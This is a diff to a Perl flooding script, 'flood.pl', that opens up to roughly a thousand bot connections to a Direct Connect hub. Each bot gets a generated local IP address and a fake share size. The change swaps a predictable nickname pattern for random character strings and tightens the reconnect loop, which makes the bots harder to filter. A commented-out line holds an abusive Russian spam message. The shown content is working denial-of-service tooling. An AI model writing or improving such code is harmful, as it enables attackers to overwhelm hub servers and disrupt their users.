@@ -40,11 +40,28 @@ sub rand_int {
   my ( $from, $to ) = @_;
   return $from + int rand( $to - $from );
 }
+
+sub rand_char {
+  my ( $from, $to ) = @_;
+  $from ||= 32+16;
+  $to ||= 60;
+  return chr(rand_int($from, $to));
+}
+
+sub rand_str{
+  my ( $len, $from, $to ) = @_;
+  $len ||= 10;
+  my $ret;
+  $ret.=rand_char($from, $to) for(0..$len);
+  return $ret;
+}
+
+
 print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
 #for my $ipc ( map { @$_ } fisher_yates_shuffle( [ 230 .. 250 ] ) ) {
 #  for my $ipd ( map { @$_ } fisher_yates_shuffle( [ 1 .. 254 ] ) ) {
-for ( 0 .. 1000 ) {
+TRY: for ( 0 .. 1000 ) {
   my $ipc = rand_int( 230, 255 );
   my $ipd = rand_int( 1,   254 );
   print "if create 10.131.$ipc.$ipd\n";
@@ -58,7 +75,9 @@ for ( 0 .. 1000 ) {
   my $dc = dcppp::clihub->new(
     'host' => $1,
     ( $2 ? ( 'port' => $2 ) : () ),
-    'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
+#    'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
+    'Nick' => ( $ARGV[1] or rand_str()),
+
     #   'Nick'		=>	'xxxx',
     'sharesize' => int( rand 100000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
     #   'log'		=>	sub {},	# no logging
@@ -74,7 +93,7 @@ for ( 0 .. 1000 ) {
   if_del(), next if !$dc->{'socket'};
   #      $dc->cmd( 'chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' );
   for ( 1 .. 15 ) {    #sleep(5); $dc->recv();
-    if_del(), next if !$dc->{'socket'} or $dc->{'status'} eq 'connected';
+    if_del(), next TRY if !$dc->{'socket'} or $dc->{'status'} eq 'connected';
     $dc->recv();
     sleep(1);
   }
